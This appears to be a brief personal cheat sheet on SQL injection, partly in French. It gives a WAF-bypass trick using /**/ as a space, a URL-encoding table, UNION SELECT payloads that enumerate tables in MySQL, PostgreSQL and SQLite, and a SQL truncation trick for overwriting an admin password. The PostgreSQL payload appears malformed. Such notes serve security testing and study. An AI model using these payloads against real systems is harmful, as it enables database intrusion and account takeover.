
# SQL injection

- WAF bypass

/**/ fonctionne comme un espace

    espace 	%20 	%20
    ! 	%21 	%21
    " 	%22 	%22
    \#  %23 	%23
    $ 	%24 	%24
    % 	%25 	%25
    & 	%26 	%26
    ' 	%27 	%27
    ( 	%28 	%28
    ) 	%29 	%29
    \* 	%2A 	%2A
    \+ 	%2B 	%2B
    , 	%2C 	%2C
    \- 	%2D 	%2D
    . 	%2E 	%2E
    / 	%2F 	%2F
    0 	%30 	%30
    1 	%31 	%31
    2 	%32 	%32
    3 	%33 	%33
    4 	%34 	%34
    5 	%35 	%35
    6 	%36 	%36
    7 	%37 	%37
    8 	%38 	%38
    9 	%39 	%39
    : 	%3A 	%3A
    ; 	%3B 	%3B
    < 	%3C 	%3C
    = 	%3D 	%3D
    \> 	%3E 	%3E
    ? 	%3F 	%3F
    @ 	%40 	%40
    A 	%41 	%41
    B 	%42 	%42
    C 	%43 	%43
    D 	%44 	%44
    E 	%45 	%45
    F 	%46 	%46
    G 	%47 	%47
    H 	%48 	%48
    I 	%49 	%49
    J 	%4A 	%4A
    K 	%4B 	%4B
    L 	%4C 	%4C
    M 	%4D 	%4D
    N 	%4E 	%4E
    O 	%4F 	%4F
    P 	%50 	%50
    Q 	%51 	%51
    R 	%52 	%52
    S 	%53 	%53
    T 	%54 	%54
    U 	%55 	%55
    V 	%56 	%56
    W 	%57 	%57
    X 	%58 	%58
    Y 	%59 	%59
    Z 	%5A 	%5A
    [ 	%5B 	%5B
    \ 	%5C 	%5C
    ] 	%5D 	%5D
    ^ 	%5E 	%5E
    _ 	%5F 	%5F
    \` 	%60 	%60
    a 	%61 	%61
    b 	%62 	%62
    c 	%63 	%63
    d 	%64 	%64
    e 	%65 	%65
    f 	%66 	%66
    g 	%67 	%67
    h 	%68 	%68
    i 	%69 	%69
    j 	%6A 	%6A
    k 	%6B 	%6B
    l 	%6C 	%6C
    m 	%6D 	%6D
    n 	%6E 	%6E
    o 	%6F 	%6F
    p 	%70 	%70
    q 	%71 	%71
    r 	%72 	%72
    s 	%73 	%73
    t 	%74 	%74
    u 	%75 	%75
    v 	%76 	%76
    w 	%77 	%77
    x 	%78 	%78
    y 	%79 	%79
    z 	%7A 	%7A
    { 	%7B 	%7B
    | 	%7C 	%7C
    } 	%7D 	%7D
    ~ 	%7E 	%7E
    	%7F 	%7F
    ` 	%80 	%E2%82%AC

- Retreive tables

1.  Mysql

	    union select group_concat(table_name) from information_schema.tables 
2. PostgreSQL
`UNION SELECT * FROM string_agg(tablename, ',') WHERE schemaname != 'pg_catalog'  AND schemaname != 'information_schema';`

3. SQLite

    `union select group_concat(name) from sqlite_master WHERE type='table'`

- SQL Truncation

e.g. :

	Update Users set password = $password where username= $login
	login = varchar(25)
	with $login = 'admin(blankspace x 19)x'

